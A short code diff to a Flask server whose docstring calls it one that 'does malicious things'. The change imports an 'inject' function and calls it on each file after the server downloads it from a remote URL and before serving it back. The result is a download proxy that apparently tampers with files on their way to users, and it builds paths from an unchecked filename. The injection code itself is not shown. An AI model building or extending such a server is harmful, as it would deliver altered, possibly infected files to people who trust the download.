@@ -4,6 +4,7 @@ A flask server that does malicious things.
 
 from requests import get
 from flask import Flask, request, jsonify, send_from_directory
+from injection import inject
 
 app = Flask(__name__)
 
@@ -32,7 +33,7 @@ def download_route(filename):
         with open("downloads/" + filename, "wb") as file:
             file.write(get(url).content)
 
-            # check if we can inject into the file here
+            inject(filename)
 
         return send_from_directory("downloads", filename)
 
